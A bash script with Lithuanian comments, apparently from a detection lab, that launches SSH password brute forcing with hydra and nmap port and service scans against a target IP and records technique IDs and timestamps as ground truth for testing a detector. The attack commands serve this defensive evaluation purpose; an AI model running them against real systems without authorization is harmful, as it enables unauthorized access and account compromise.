#!/usr/bin/env bash
# Linux atakos iš Kali prieš taikinį; kiekvienos pradžios/pabaigos laikas (UTC) rašomas
# į ground_truth.jsonl — vėliau sulyginamas su detektoriaus alertais (lab/collect_ground_truth.py).
#
#   TARGET=192.168.122.50 ./attacks.sh            # visi scenarijai
#   TARGET=192.168.122.50 ./attacks.sh ssh_bruteforce
#
# Reikia: hydra, nmap. Taikinys — lab/linux/provision.sh paruoštas serveris (sshd + rsyslog TLS).
set -uo pipefail
TARGET="${TARGET:?Nurodykite TARGET=<taikinio IP>}"
OUT="${OUT:-ground_truth.jsonl}"
USERLIST="${USERLIST:-/usr/share/wordlists/metasploit/unix_users.txt}"
PASSLIST="${PASSLIST:-/usr/share/wordlists/rockyou.txt}"

mark() {  # mark <technika> <pavadinimas> <start_iso> <end_iso>
  printf '{"technique":"%s","name":"%s","start":"%s","end":"%s","host":"%s"}\n' \
    "$1" "$2" "$3" "$4" "$TARGET" >> "$OUT"
}
run() {  # run <technika> <pavadinimas> <komanda...>
  local tech="$1" name="$2"; shift 2
  local start; start=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  echo "== $name ($tech) =="
  "$@" || true
  mark "$tech" "$name" "$start" "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  sleep $((RANDOM % 60 + 20))
}

ssh_bruteforce() {
  run T1110.001 ssh_bruteforce hydra -L "$USERLIST" -P <(head -50 "$PASSLIST") \
    -t 4 -f "ssh://$TARGET" -o hydra.log
}
port_scan() {
  run T1046 port_scan nmap -sS -T4 -p- "$TARGET" -oN nmap.log
}
service_scan() {
  run T1046 service_scan nmap -sV -T4 --top-ports 200 "$TARGET" -oN nmap-sv.log
}

scenarios=("${@:-ssh_bruteforce port_scan service_scan}")
for s in ${scenarios[@]}; do "$s"; done
echo "Ground truth: $OUT"
